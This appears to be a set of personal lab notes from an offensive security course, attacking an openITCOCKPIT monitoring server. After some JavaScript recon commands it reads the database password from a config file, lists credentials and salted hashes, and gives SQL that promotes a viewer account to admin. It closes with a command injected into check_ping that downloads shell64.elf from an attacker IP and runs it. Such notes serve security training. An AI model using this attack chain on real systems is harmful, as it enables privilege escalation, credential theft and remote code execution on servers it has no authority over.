Mining js interesting files (requires some minor cleanup of commands.html):
sls ./commands.html -Pattern 'script .*src.*</script>' -AllMatches | sls -NotMatch 'vendor|lib|plugin' | select-object -Property Matches | % -process { Add-Content list.txt -value $_.Matches.Value }
Cleaning them up into proper urls:
sls ./list.txt -Pattern '"(/js.*|/front.*)+.js' | select-object -property Matches | % -process {Add-Content interesting-files.txt -value "https://opentitcockpit$($_.Matches.value.replace('`"',''))"}
Getting all of the files:
foreach($i in $(gc ./interesting-files.txt)) {$res = iwr $i -SkipCertificateCheck; $filename = $i.replace('https://',''); New-Item -ItemType file -Path ./test -Name $filename.replace('/','-') -Value $res.content}
Prettying all the compressed files:
gci test -Filter '*-compressed*' | select-object -property name | % -process {$file = $_.name; $filepath="./test/$file";  js-beautify -o "$($filepath).pretty" $filepath}

Extra Mile
db password can be found in: /etc/openitcockpit/app/Config/database.php
we can check that the password is indeed valid using:
./check_mysql -d openitcockpit -H localhost -P 3306 -u openitcockpit -p eloCRIuPt6qg
connect to mysql:
mysql -u openitcockpit -h localhost -p openitcockpit
promote viewer user to admin:
update users set usergroup_id = 1 where email='view@viewer.local';
we can verify that the viewer user indeed has admin priviledges by attempt to create a user in the administration tab.
password hashing:
fIxfs2guY2dnK2nLsnbdk5lbUubWwvni - salt
567760565165161512253584553 - seed


b7b56fad3c414b8e2dcb461c9c31fdaf7d78a1e3  - viewer(pwd is 27NZDLgfnY)
edb72ea1de1ff141d86748f1e79c1f20659062b9 - bagel (pwd is donkey123)

fIxfs2guY2dnK2nLsnbdk5lbUubWwvni27NZDLgfnY
fIxfs2guY2dnK2nLsnbdk5lbUubWwvnidonkey123
Promote view user to admin and reset its password. Note that is done non-interactively
mysql -u openitcockpit -h localhost -p openitcockpit --password=eloCRIuPt6qg --execute="update users set usergroup_id = 1 where email='view@viewer.local';update users set password='edb72ea1de1ff141d86748f1e79c1f20659062b9' where email='view@viewer.local'";
Gaining a shell through custom command:
1. Navigate to Basic Monitoring => commands => check_ping
2. Add the following to the commandline for check_ping: wget http://192.168.119.130/shell64.elf -O /tmp/shell64.elf && chmod +x /tmp/shell64.elf && /tmp/shell64.elf; 
3. Refresh the nagios configuration(top left rectangular refresh)
4. Navigate to Basic Monitoring => Services => Ping
5. Refresh Service (left circular refresh) to execute the updated command immediately.
